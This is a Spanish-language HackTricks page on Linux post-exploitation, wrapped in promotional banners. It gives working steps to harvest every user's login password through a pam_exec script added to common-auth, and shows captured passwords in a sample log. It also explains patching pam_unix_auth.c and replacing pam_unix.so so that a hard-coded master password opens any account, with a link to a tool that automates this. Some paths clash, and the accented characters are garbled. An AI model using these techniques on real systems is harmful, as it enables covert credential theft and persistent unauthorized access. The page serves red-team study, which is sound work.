# Post-Explotaci贸n en Linux

<details>

<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCIN**](https://github.com/sponsors/carlospolop)!
* Obt茅n el [**swag oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci贸n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **nete al**  [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s铆guenos** en **Twitter**  [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.

</details>

## Capturando Contrase帽as de Inicio de Sesi贸n con PAM

Configuraremos un m贸dulo PAM para registrar cada contrase帽a que cada usuario utilice para iniciar sesi贸n. Si no sabes qu茅 es PAM, consulta:

{% content-ref url="pam-pluggable-authentication-modules.md" %}
[pam-pluggable-authentication-modules.md](pam-pluggable-authentication-modules.md)
{% endcontent-ref %}

Primero, creamos un script bash que se invocar谩 cada vez que ocurra una nueva autenticaci贸n.
```bash
#!/bin/sh
echo " $(date) $PAM_USER, $(cat -), From: $PAM_RHOST" >> /var/log/toomanysecrets.log
```
Las variables son espec铆ficas de PAM y estar谩n disponibles a trav茅s del m贸dulo `pam_exec.so`.

Aqu铆 est谩 el significado de las variables:

* **$PAM\_USER:** El nombre de usuario que se ingres贸.
* **$PAM\_RHOST:** El host remoto (t铆picamente la direcci贸n IP)
* **$(cat -):** Esto lee `stdin`, y contendr谩 la contrase帽a que el script captura
* Los resultados se redirigen a un archivo de registro en `/var/log/toomanysecrets.log`

Para **evitar que todos los usuarios lean** el archivo, considere crearlo previamente y ejecutar `chmod`, por ejemplo:
```bash
sudo touch /var/log/toomanysecrets.sh
sudo chmod 770 /var/log/toomanysecrets.sh
```
A continuaci贸n, es necesario actualizar el archivo de configuraci贸n PAM, se utilizar谩 el m贸dulo `pam_exec` para invocar el script.

Existen varios archivos de configuraci贸n ubicados en `/etc/pam.d/`, y seleccionamos `common-auth`.
```
sudo nano /etc/pam.d/common-auth
```
En la parte inferior del archivo, a帽ade el siguiente m贸dulo de autenticaci贸n:

```plaintext
auth optional pam_exec.so quiet expose_authtok /usr/local/bin/toomanysecrets.sh
```

Los significados de las opciones son los siguientes:

- **optional:** La autenticaci贸n no fallar谩 si hay un error (no es un paso obligatorio)
- **pam\_exec.so:** Este es el m贸dulo PAM de "living off the land" que puede invocar scripts arbitrarios
- **expose\_authtok:** Este es el truco que permite leer la contrase帽a a trav茅s de `stdin`
- **quiet:** No mostrar errores al usuario (si algo no funciona)
- El 煤ltimo argumento es el script de shell que se cre贸 previamente

![](<../../.gitbook/assets/image (375).png>)

Finalmente, haz que el archivo sea ejecutable:

```plaintext
sudo chmod 700 /usr/local/bin/toomanysecrets.sh
```

Ahora, probemos esto y hagamos ssh desde otra m谩quina, o inicia sesi贸n localmente.

Y luego, revisa el archivo de registro:
```
$ sudo cat /var/log/toomanysecrets.log
Sun Jun 26 23:36:37 PDT 2022 tom, Trustno1!, From: 192.168.1.149
Sun Jun 26 23:37:53 PDT 2022 tom, Trustno1!, From:
Sun Jun 26 23:39:12 PDT 2022 tom, Trustno1!, From: 192.168.1.149
```
### Instalaci贸n de puertas traseras en PAM

Vamos a los fuentes de PAM (depende de tu distribuci贸n, toma el mismo n煤mero de versi贸n que la tuya..) y busca alrededor de las l铆neas 170/180 en el archivo pam\_unix\_auth.c:
```
vi modules/pam_unix/pam_unix_auth.c
```
![](<../../.gitbook/assets/image (651).png>)

Cambiamos esto por:

![](<../../.gitbook/assets/image (638) (2) (2).png>)

Esto permitir谩 que cualquier usuario que use la **contrase帽a "0xMitsurugi"** pueda iniciar sesi贸n.

Recompila el `pam_unix_auth.c` y reemplaza el archivo pam_unix.so:
```bash
make
sudo cp \
/home/mitsurugi/PAM/pam_deb/pam-1.1.8/modules/pam_unix/.libs/pam_unix.so \
/lib/x86_64-linux-gnu/security/
```
{% hint style="info" %}
Puedes automatizar este proceso con [https://github.com/zephrax/linux-pam-backdoor](https://github.com/zephrax/linux-pam-backdoor)
{% endhint %}

## Referencias

* [https://embracethered.com/blog/posts/2022/post-exploit-pam-ssh-password-grabbing/](https://embracethered.com/blog/posts/2022/post-exploit-pam-ssh-password-grabbing/)
* [https://infosecwriteups.com/creating-a-backdoor-in-pam-in-5-line-of-code-e23e99579cd9](https://infosecwriteups.com/creating-a-backdoor-in-pam-in-5-line-of-code-e23e99579cd9)

<details>

<summary><strong>Aprende hacking en AWS de cero a h茅roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** 隆Consulta los [**PLANES DE SUSCRIPCIN**](https://github.com/sponsors/carlospolop)!
* Obt茅n la [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci贸n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **nete al**  [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s铆guenos** en **Twitter**  [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
